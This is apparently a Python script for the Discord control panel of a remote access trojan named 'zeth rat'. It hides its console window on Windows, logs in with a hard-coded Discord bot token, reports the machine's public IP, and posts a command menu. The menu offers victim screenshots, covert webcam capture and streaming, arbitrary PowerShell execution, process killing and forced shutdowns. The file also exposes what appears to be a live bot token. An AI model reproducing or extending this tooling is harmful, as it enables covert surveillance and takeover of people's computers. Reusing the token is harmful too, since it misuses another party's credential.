import discord
import requests
import sys
import ctypes

# hide console
if sys.platform == "win32":
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass


DISCORD_TOKEN = "MTU0MjczMDk0MTI2NzU3NDg0NA.G_TQEr.Mf4kjdpPMLvLdhL0DjzDK8V1ZlxhhgzyQiUchk"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    try:
        guild = client.guilds[0]
        ip = requests.get("https://api.ipify.org", timeout=5).text.replace(",", "-")
        
        # Check if channel exists
        channel = discord.utils.get(guild.channels, name=f"ZETH-RAT-PANEL-")
        if not channel:
            channel = await guild.create_text_channel(f"zeth-rat-")
        
        # Create embed help panel
        embed = discord.Embed(
            title="zeth rat control panel",
            description="doesnt do nun, just shows u the cmds, go to ctrl here channel to use rat fr - made by zeth",
            color=0x2b2d31
        )
        
        embed.add_field(
            name="screenshot",
            value="takes a screenshot of the victims screen",
            inline=False
        )
        embed.add_field(
            name="fullscreen",
            value="takes a screenshot of all monitors",
            inline=False
        )
        embed.add_field(
            name="webcam",
            value="takes a photo from the victims webcam",
            inline=False
        )
        embed.add_field(
            name="videostart",
            value="starts live webcam video stream with ngrok remote access",
            inline=False
        )
        embed.add_field(
            name="videostop",
            value="stops the live video stream",
            inline=False
        )
        embed.add_field(
            name="videoframe",
            value="sends a single frame from the video stream",
            inline=False
        )
        embed.add_field(
            name="bckgroundchange",
            value="attach an image with this command to change wallpaper",
            inline=False
        )
        embed.add_field(
            name="playaudio",
            value="attach an audio file with this command to play it",
            inline=False
        )
        embed.add_field(
            name="website [url]",
            value="opens a website in the victims browser (example: website github.com)",
            inline=False
        )
        embed.add_field(
            name="spam [message]",
            value="spams a message in the discord channel (example: spam hello)",
            inline=False
        )
        embed.add_field(
            name="stop",
            value="stops the spam",
            inline=False
        )
        embed.add_field(
            name="shutdown",
            value="shuts down the victims computer",
            inline=False
        )
        embed.add_field(
            name="restart",
            value="restarts the victims computer",
            inline=False
        )
        embed.add_field(
            name="systeminfo",
            value="shows system information of the victim",
            inline=False
        )
        embed.add_field(
            name="whoami",
            value="shows the current user on the victims system",
            inline=False
        )
        embed.add_field(
            name="tasks",
            value="shows all running processes on the victims system",
            inline=False
        )
        embed.add_field(
            name="kill [process.exe]",
            value="kills a running process on the victims system",
            inline=False
        )
        embed.add_field(
            name="any powershell command",
            value="runs any powershell command on the victims system",
            inline=False
        )
        
        embed.set_footer(text="made by zeth | rat is ready")
        
        await channel.send(embed=embed)
        
        print(f"control panel created: #{channel.name}")
        print(f"channel id: {channel.id}")
        print("rat will auto-connect to this channel")
        
    except Exception as e:
        print(f"error: {e}")

@client.event
async def on_message(message):
    if message.author.bot:
        return
    # just logs messages - does nothing else
    print(f"[{message.channel.name}] {message.author}: {message.content}")

try:
    client.run(DISCORD_TOKEN)
except Exception as e:
    print(f"error: {e}")